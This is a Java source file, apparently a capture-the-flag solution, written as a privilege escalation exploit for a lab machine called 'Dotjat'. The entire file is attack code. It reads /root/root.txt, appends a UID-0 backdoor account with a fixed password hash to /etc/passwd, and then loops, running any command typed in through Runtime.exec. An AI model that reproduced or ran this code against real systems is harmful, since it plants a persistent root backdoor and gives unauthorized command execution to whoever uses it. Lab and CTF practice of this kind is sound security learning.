package com.medium.musyokaian;

import java.io.*;
import java.util.Scanner;

public class Main {

    public static void main(String[] args) {
        privilege_escalation();
    }
    public  static void privilege_escalation() {
        System.out.println("[+] Author Musyoka ian");
        System.out.println("[+] Privilege Escalation exploit for Vunnet: Dotjat");
        Scanner scanner = new Scanner(System.in);
        System.out.println("[+] Reading root.txt flag");
        try {
            BufferedReader bufferedReader = new BufferedReader(new FileReader("/root/root.txt"));
            String lines;
            while ((lines = bufferedReader.readLine()) != null){
                System.out.println("[+] Root Flag: " + lines);
            }
        }catch (IOException e){
            e.getMessage();
        }
        System.out.println("\n\n[+] Creating a user called musyoka with root access on the system");
        try {
            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter("/etc/passwd", true));
            bufferedWriter.write("musyoka:$1$LXzL5yX6$6aM4kCt/v4k6E93DwNxt5/:0:0:musyoka:/root:/bin/bash");
            bufferedWriter.close();
        }catch (IOException e){
            e.getMessage();
        }

        while (true){
            System.out.print("Entering a shell >>");
            String command ;
            command = scanner.nextLine();
            Process output;
            try {
                output = Runtime.getRuntime().exec(command);
                BufferedReader bufferedReader1 = new BufferedReader(new InputStreamReader(output.getInputStream()));
                BufferedReader bufferedReader2 = new BufferedReader(new InputStreamReader(output.getErrorStream()));
                String out;
                while ((out = bufferedReader1.readLine()) != null){
                    System.out.println(out);
                }
                while ((out = bufferedReader2.readLine()) != null) {
                    System.out.println(out);
                }
            }catch (IOException e) {
                e.getMessage();
            }
        }

    }
}
